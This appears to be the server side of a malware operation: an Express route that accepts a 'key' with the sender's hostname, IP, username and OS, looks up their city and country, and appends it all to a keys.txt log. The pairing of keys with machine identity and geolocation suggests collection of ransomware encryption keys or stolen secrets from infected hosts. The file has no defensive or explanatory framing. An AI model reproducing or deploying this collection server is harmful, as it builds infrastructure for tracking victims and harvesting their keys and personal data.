
const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const geoip = require('geoip-lite');

router.use(express.json({ limit: '10mb' }));

router.post('/', async (req, res) => {
  const { key, hostname, ip, username, os } = req.body;

  if (!key) return res.status(400).json({ message: 'No key provided' });

  // GeoIP location
  const geo = geoip.lookup(ip);
  const location = geo ? `${geo.city || 'Unknown City'}, ${geo.country || 'Unknown Country'}` : 'Unknown';

  const logLine = `[${new Date().toISOString()}] ${key} | Host: ${hostname || 'unknown'} | IP: ${ip || 'unknown'} | Loc: ${location} | User: ${username || 'unknown'} | OS: ${os || 'unknown'}\n`;

  try {
    const logPath = path.join(__dirname, '../../logs/keys.txt');
    fs.appendFileSync(logPath, logLine, 'utf8');
    res.status(200).json({ message: 'Key logged with system info' });
  } catch (error) {
    console.error('Logging error:', error.message);
    res.status(500).json({ message: 'Error saving key' });
  }
});

module.exports = router;
